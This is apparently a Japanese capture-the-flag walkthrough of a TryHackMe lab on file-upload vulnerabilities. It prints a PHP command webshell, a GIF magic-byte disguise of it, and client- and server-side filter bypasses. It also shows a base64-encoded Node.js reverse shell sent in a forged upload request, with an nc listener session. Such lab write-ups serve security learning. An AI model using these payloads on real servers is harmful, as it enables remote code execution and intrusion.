# Upload Vulnerabilities writeup
https://tryhackme.com/room/uploadvulns

## [Task 1] Getting Started
No questions.

## [Task 2] Introduction
No questions.

## [Task 3] General Methodology
No questions.

## [Task 4] Overwriting Existing Files
http://overwrite.uploadvulns.thm/ にアクセスする。

### #1
ページのソースを確認。  
アップロード先と同じディレクトリに既に存在するファイル名を見つける。。
```html
	<body>
		<img src="images/XXXXXXXXX.jpg" alt="">
		<main>
```

### #2
既にあるファイルを上書きするとFlagが表示される。

## [Task 5] Remote Code Execution
http://shell.uploadvulns.thm/ にアクセスする。

### #1
ファイルアップロード先のディレクトリ名を探索する。
```shell
[root@kali]# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -e -x php,html,txt -u http://shell.uploadvulns.thm
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://shell.uploadvulns.thm
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,html,txt
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/09/02 22:07:38 Starting gobuster
===============================================================
http://shell.uploadvulns.thm/index.php (Status: 200)
http://shell.uploadvulns.thm/resources (Status: 301)
http://shell.uploadvulns.thm/assets (Status: 301)
Progress: 6159 / 87665 (7.03%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/09/02 22:18:25 Finished
===============================================================
```

### #2
クエリストリングでコマンドを受け付けるphpを作成し、アップロードする。
```php
<?php
    echo system($_GET["cmd"]);
?>
```
catコマンドでFlagを参照する。
> http://shell.uploadvulns.thm/resources/webshell.php?cmd=cat%20/var/www/flag.txt

## [Task 6] Filtering

### #1 What is the traditional server-side scripting language?
Omission.

### #2 When validating by file extension, what would you call a list of accepted extensions (whereby the server rejects any extension not in the list)?
Omission.

### #3 [Research] What MIME type would you expect to see when uploading a CSV file?
Omission.

## [Task 7] Bypassing Client-Side Filtering
http://java.uploadvulns.thm/ にアクセスする。

`php`をアップロードすると、HTTPリクエスト以前で *Invalid File Type* エラーになる。  
`client-side-filter.js`を見てみると、以下のようにチェックしている。
```js
window.onload = function(){
	var upload = document.getElementById("fileSelect");
	var responseMsg = document.getElementsByClassName("responseMsg")[0];
	var errorMsg = document.getElementById("errorMsg");
	var uploadMsg = document.getElementById("uploadtext");
	upload.value="";
	upload.addEventListener("change",function(event){
		var file = this.files[0];
		responseMsg.style = "display:none;";
		if (file.type != "image/png"){
			upload.value = "";
			uploadMsg.style = "display:none;";
			error();
		} else{
			uploadMsg.innerHTML = "Chosen File: " + upload.value.split(/(\\|\/)/g).pop();
			responseMsg.style="display:none;";
			errorMsg.style="display:none;";
			success();
		}
	});
};
```

`file.type != "image/png"`のチェックをしないように`js`をDevToolsで書き換えると、なんでもアップロード可能になる。  

catコマンドでFlagを参照する。
> http://java.uploadvulns.thm/images/webshell.php?cmd=cat%20/var/www/flag.txt

## [Task 8] Bypassing Server-Side Filtering: File Extensions
http://annex.uploadvulns.thm/ にアクセスする。  
いろいろ試してみると、拡張子`php5`は使用できると分かる。

catコマンドでFlagを参照する。
> http://annex.uploadvulns.thm/privacy/2020-09-02-14-06-24-webshell.php5?cmd=cat%20/var/www/flag.txt

## [Task 9] Bypassing Server-Side Filtering: Magic Numbers
http://magic.uploadvulns.thm/ にアクセスする。  
`gif`ファイルしか受け付けないことが分かる。

`php`のマジックバイトを`gif`に書き換えたものをアップロードする。
```
00000000   47 49 46 38  0D 0A 3C 3F  70 68 70 0D  0A 20 20 20  20 65 63 68  6F 20 73 79  73 74 65 6D  GIF8..<?php..    echo system
0000001C   28 24 5F 47  45 54 5B 22  63 6D 64 22  5D 29 3B 0D  0A 3F 3E                               ($_GET["cmd"]);..?>
```
catコマンドでFlagを参照する。
> http://magic.uploadvulns.thm/graphics/webshell_gif.php?cmd=cat%20/var/www/flag.txt

## [Task 10] Example Methodology
No question.

## [Task 11] Challenge
http://jewel.uploadvulns.thm/ にアクセスする。

gobusterでディレクトリを確認しておく。
```shell
[root@kali]# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -e -x php,html,txt -u http://jewel.uploadvuln
s.thm/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://jewel.uploadvulns.thm/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php,html
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/09/04 01:19:27 Starting gobuster
===============================================================
http://jewel.uploadvulns.thm/content (Status: 301)
http://jewel.uploadvulns.thm/modules (Status: 301)
http://jewel.uploadvulns.thm/admin (Status: 200)
http://jewel.uploadvulns.thm/assets (Status: 301)
```

画面から`jpg`をアップロードしてみる。
```http
POST http://jewel.uploadvulns.thm/ HTTP/1.1
Host: jewel.uploadvulns.thm
Connection: keep-alive
Content-Length: 915
Pragma: no-cache
Cache-Control: no-cache
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Content-Type: application/json
Origin: http://jewel.uploadvulns.thm
Referer: http://jewel.uploadvulns.thm/
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8,ko;q=0.7

{"name":"1x1.jpg","type":"image/jpeg","file":"data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAIBAQIBAQICAgICAgICAwUDAwMDAwYEBAMFBwYHBwcGBwcICQsJCAgKCAcHCg0KCgsMDAwMBwkODw0MDgsMDAz/2wBDAQICAgMDAwYDAwYMCAcIDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAz/wAARCAABAAEDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD9/KKKKAP/2Q=="}
```
アップロードに成功すると、successが帰ってくる。  
`X-Powered-By`ヘッダの`Express`から、Node.jsが動いていることが分かる。
```http
HTTP/1.1 200 OK
Server: nginx/1.17.6
Date: Thu, 03 Sep 2020 15:58:20 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 7
Connection: keep-alive
X-Powered-By: Express
Access-Control-Allow-Origin: *
ETag: W/"7-U6VofLJtxB8qtAM+l+E63v03QNY"

success
```

アップロードした画像ファイルをgobusterで探す。  
ファイル名リストは設問内で指定されているものを使う。  
ランダムなアルファベット3文字＋`.jpg`と命名されている。
```shell
[root@kali]# gobuster dir -w UploadVulnsWordlist.txt -e -x jpg -u http://jewel.uploadvulns.thm/content/ -t 80
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://jewel.uploadvulns.thm/content/
[+] Threads:        80
[+] Wordlist:       newlist.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     jpg
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/09/04 00:14:52 Starting gobuster
===============================================================
http://jewel.uploadvulns.thm/content/ABH.jpg (Status: 200)
http://jewel.uploadvulns.thm/content/BOQ.jpg (Status: 200)
http://jewel.uploadvulns.thm/content/IXT.jpg (Status: 200)
```

`jpg`以外のアップロードは、JavaScriptで防がれている。  
```javascript
//Check File Size
if (event.target.result.length > 50 * 8 * 1024){
	setResponseMsg("File too big", "red");			
	return;
}
//Check Magic Number
if (atob(event.target.result.split(",")[1]).slice(0,3) != "ÿØÿ"){
	setResponseMsg("Invalid file format", "red");
	return;	
}
//Check File Extension
const extension = fileBox.name.split(".")[1].toLowerCase();
if (extension != "jpg" && extension != "jpeg"){
	setResponseMsg("Invalid file format", "red");
	return;
}
```

クライアントではJavaScriptの通り、マジックバイトや拡張子を見ているが、  
サーバではリクエスト中の`type`で指定したMIME-Typeしか見ていないことが試行していると分かる。  

Node.jsで動作するリバースシェルを入手する。
```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4242, "127.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

Fiddlerなどを使い、アップロードに成功した通信を再送。  
ファイルの内容をリバースシェルと書き換える。

```http
POST http://jewel.uploadvulns.thm/ HTTP/1.1
Host: jewel.uploadvulns.thm
Connection: keep-alive
Content-Length: 915
Pragma: no-cache
Cache-Control: no-cache
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Content-Type: application/json
Origin: http://jewel.uploadvulns.thm
Referer: http://jewel.uploadvulns.thm/
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8,ko;q=0.7

{"name":"1x1.jpg","type":"image/jpeg","file":"data:image/jpeg;base64,KGZ1bmN0aW9uKCl7DQogICAgdmFyIG5ldCA9IHJlcXVpcmUoIm5ldCIpLA0KICAgICAgICBjcCA9IHJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKSwNCiAgICAgICAgc2ggPSBjcC5zcGF3bigiL2Jpbi9zaCIsIFtdKTsNCiAgICB2YXIgY2xpZW50ID0gbmV3IG5ldC5Tb2NrZXQoKTsNCiAgICBjbGllbnQuY29ubmVjdCg0MjQyLCAiMTI3LjAuMC4xIiwgZnVuY3Rpb24oKXsNCiAgICAgICAgY2xpZW50LnBpcGUoc2guc3RkaW4pOw0KICAgICAgICBzaC5zdGRvdXQucGlwZShjbGllbnQpOw0KICAgICAgICBzaC5zdGRlcnIucGlwZShjbGllbnQpOw0KICAgIH0pOw0KICAgIHJldHVybiAvYS87IC8vIFByZXZlbnRzIHRoZSBOb2RlLmpzIGFwcGxpY2F0aW9uIGZvcm0gY3Jhc2hpbmcNCn0pKCk7DQo=
```

再度gobusterを使い、ファイル名を確認する。
```shell
[root@kali]# gobuster dir -w newlist.txt -e -x jpg -u http://jewel.uploadvulns.thm/content/ -t 80
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://jewel.uploadvulns.thm/content/
[+] Threads:        80
[+] Wordlist:       newlist.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     jpg
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/09/04 00:58:29 Starting gobuster
===============================================================
http://jewel.uploadvulns.thm/content/ABH.jpg (Status: 200)
http://jewel.uploadvulns.thm/content/BOQ.jpg (Status: 200)
http://jewel.uploadvulns.thm/content/IKX.jpg (Status: 200)
http://jewel.uploadvulns.thm/content/IXT.jpg (Status: 200)
```

`/admin`に移動すると下記の記載がある。
> As a reminder: use this form to activate modules from the /modules directory.

`/modules`のファイルを実行してくれるようだが、リバースシェルのアップロード先は`/content`。  
`../content/IKX.jpg`と入力すると、リバースシェルが実行される。  
```shell
[root@kali]# nc -lvp 4242
listening on [any] 4242 ...
connect to [10.x.x.x] from overwrite.uploadvulns.thm [10.x.x.x] 57118
pwd
/var/www/html
cd ../
ls
flag.txt
html
cat flag.txt
```
